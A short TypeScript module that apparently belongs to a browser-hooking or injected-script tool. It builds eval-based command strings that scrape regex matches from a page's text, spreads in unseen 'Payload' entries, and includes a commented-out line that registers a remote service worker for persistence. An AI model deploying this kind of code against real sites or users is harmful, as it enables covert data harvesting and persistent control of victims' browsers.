import * as Constants from "@src/constants";

export const Commands = (cmd: string, URL: string) => {
  return {
    ...Constants.BrowserCmds,
    browser: `Object.assign({},...Object.entries(${JSON.stringify(
      Constants.BrowserCmds
    )}).map(([key,value])=>({[key]:eval(value)})))`,
    info: `Object.assign({},...Object.entries(${JSON.stringify(
      Constants.InfoRegex
    )}).map(([key, value]) => ({[key]: [...new Set(document.body.textContent?.matchAll(eval(value.primary)))].map((item) =>value.secondary ? item[0].replace(eval(value?.secondary), "").trim() : item[0].trim()).filter(Boolean),})).filter((item) => Object.values(item)[0].length))`,
    // persist:"navigator.serviceWorker.register('https://mui.com/sw.js').then((registration)=>`ServiceWorker registration successful with scope: ${registration.scope}`).catch((err)=>`ServiceWorker registration failed:${err}`)",
    ...Constants.Payload(URL),
  }[cmd];
};
